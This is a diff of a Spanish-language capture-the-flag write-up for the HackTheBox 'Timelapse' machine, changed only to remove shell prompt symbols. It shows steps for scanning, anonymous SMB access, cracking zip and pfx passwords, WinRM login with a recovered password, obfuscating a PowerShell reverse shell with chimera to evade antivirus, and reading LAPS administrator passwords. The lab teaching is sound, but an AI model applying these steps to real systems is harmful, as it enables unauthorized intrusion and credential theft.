@@ -58,7 +58,7 @@ It's time to show your love.
 Lo primero que debemos hacer es conocer contra que nos enfrentamos y sobre todo con que cuenta, ya que ese será nuestro punto de entrada. Usaré la herramienta `nmap` para descubrir que puertos (servicios) está ejecutando la máquina:
 
 ```bash
-❱ nmap -p- --open -v -Pn 10.10.11.152 -oG initScan
+nmap -p- --open -v -Pn 10.10.11.152 -oG initScan
 ```
 
 | Parámetro | Descripción |
@@ -99,7 +99,7 @@ Ahora que tenemos los puertos podemos volver a apoyarnos de `nmap` para intentar
 **)~**
 
 ```bash
-❱ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49694,57865 -sC -sV -Pn 10.10.11.152 -oN portScan
+nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49694,57865 -sC -sV -Pn 10.10.11.152 -oN portScan
 ```
 
 | Parámetro | Descripción |
@@ -182,7 +182,7 @@ SMB1 disabled -- no workgroup available
 Opa, tenemos contenidoooooooo! Existen varias carpetas compartidas, (por la experiencia con otras máquinas) sabemos que la única extraña es `Shares` (las demás están por default con SMB), aprovechemos `smbclient` para intentar listar su contenido, en caso de que nos deje lo que hará es otorgarnos una "Shell" para recorrer la carpeta:
 
 ```bash
-❱ smbclient //10.10.11.152/Shares --no-pass
+smbclient //10.10.11.152/Shares --no-pass
 ```
 
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_smbclient_Shares.png" style="width: 100%;"/>
@@ -242,19 +242,19 @@ La herramienta se llama `zip2john` (que también existe una llamada `fcrackzip` 
 Ejecutamos `zip2john` pasándole el archivo:
 
 ```bash
-❱ zip2john winrm_backup.zip
+zip2john winrm_backup.zip
 ```
 
 Nos genera un **hash** gigante, guardémoslo en un archivo:
 
 ```bash
-❱ zip2john winrm_backup.zip > winrm_backup.hash
+zip2john winrm_backup.zip > winrm_backup.hash
 ```
 
 Ya con el archivo lo siguiente es hacer lo que ya dijimos, usar [john](https://www.openwall.com/john/) para romper ese hash (si es que la contraseña está en el wordlist que le pasemos, ya que lo que hace es ir probando cada palabra contra el hash y si alguna hace *match* significa que es la contraseña) y por consiguiente obtener la password en texto plano:
 
 ```bash
-❱ john -w:/usr/share/wordlists/rockyou.txt winrm_backup.hash 
+john -w:/usr/share/wordlists/rockyou.txt winrm_backup.hash 
 ```
 
 * `-w`: Tiene el wordlist (lista de posibles contraseñas).
@@ -320,7 +320,7 @@ Para ello debemos hacer uso de [openssl](https://es.wikipedia.org/wiki/OpenSSL) 
 🔒 Extraemos llave privada:
 
 ```bash
-❱ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes
 ```
 
 Pero en su ejecución:
@@ -340,8 +340,8 @@ En este caso mi sistema no lo tiene instalado, pero en una búsqueda rápida en 
 Lo descargamos y simplemente ejecutamos:
 
 ```bash
-❱ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/pfx2john.py
-❱ python3 pfx2john.py legacyy_dev_auth.pfx
+wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/pfx2john.py
+python3 pfx2john.py legacyy_dev_auth.pfx
 ```
 
 Nos genera de nuevo un output gigante, lo guardamos en un archivo yyyy jugamos:
@@ -363,7 +363,7 @@ PEEEEERFECTO! Tenemos la contraseña en texto plano :P Pos volvamos a probar a e
 🔒 Extraemos llave privada:
 
 ```bash
-❱ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes
 ```
 
 Colocamos la contraseña y obtenemos la llave privada :D
@@ -373,7 +373,7 @@ Colocamos la contraseña y obtenemos la llave privada :D
 🔑 Ahora extraemos certificado SSL (llave pública):
 
 ```bash
-❱ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
 ```
 
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_openssl_extractSSLyKEY_ssl_PW_DONE.png" style="width: 80%;"/>
@@ -412,7 +412,7 @@ El uso de `evil-winrm` nos permite entre muchas cosas entablar una **PowerShell*
 Podemos jugar con las llaves (SSL) para intentar entablarnos una **PowerShell**, veamos:
 
 ```bash
-❱ evil-winrm -i 10.10.11.152 -u 'legacyy' -p 'thuglegacy' -S -c cert.pem -k privkey.pem
+evil-winrm -i 10.10.11.152 -u 'legacyy' -p 'thuglegacy' -S -c cert.pem -k privkey.pem
 ```
 
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_evilwinrm_legacyyPS.png" style="width: 100%;"/>
@@ -554,7 +554,7 @@ Obviamente, hace muchos más procesos, pues probemos a ofuscar el contenido de n
 Generamos el nuevo archivo llamado `new_invoke_shell.ps1`:
 
 ```bash
-❱ ./chimera/chimera.sh -f Invoke-PowerShellTcp.ps1 -l 3 -o new_invoke_shell.ps1 -v -t powershell,windows,copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,invoke-expression,out-string,write-error -j -g -k -r -p
+./chimera/chimera.sh -f Invoke-PowerShellTcp.ps1 -l 3 -o new_invoke_shell.ps1 -v -t powershell,windows,copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,invoke-expression,out-string,write-error -j -g -k -r -p
 ```
 
 > Ejecutando `./chimera.sh` puedes ver que hace cada parametro agregado :P
@@ -568,7 +568,7 @@ khe khe :P, pues si, eso es ofuscamiento (:
 Subimos ese archivo al sistema yyy lo ejecutamos a ver si con él tenemos éxito:
 
 ```powershell
-*Evil-WinRM* PS C:\> invoke-c... -scriptblock { ./new_invoke_shell.ps1.ps1 }
+invoke-c... -scriptblock { ./new_invoke_shell.ps1.ps1 }
 ```
 
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_svcDeploy_RevPS_DONE.png" style="width: 100%;"/>
@@ -612,7 +612,7 @@ Pues se emplean comandos que juegan con él.
 En este caso él lo usa para extraer entre las propiedades del **computador** una llamada `MS-Mcs-AdmPwd`, que sería la que guarda la contraseña del **administrador** local <u>en texto plano</u> según [netwrix](https://blog.netwrix.com/2021/08/25/running-laps-in-the-race-to-security/#Extending_your_Active_Directory_schema_to_accommodate_LAPS), pues veamos que nos devuelve el comando ejecutado y si realmente la propiedad nos muestra la password :o
 
 ```powershell
-Ps >Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd
+Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd
 ```
 
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_svcDeploy_GetADComputer_leakPassword.png" style="width: 80%;"/>
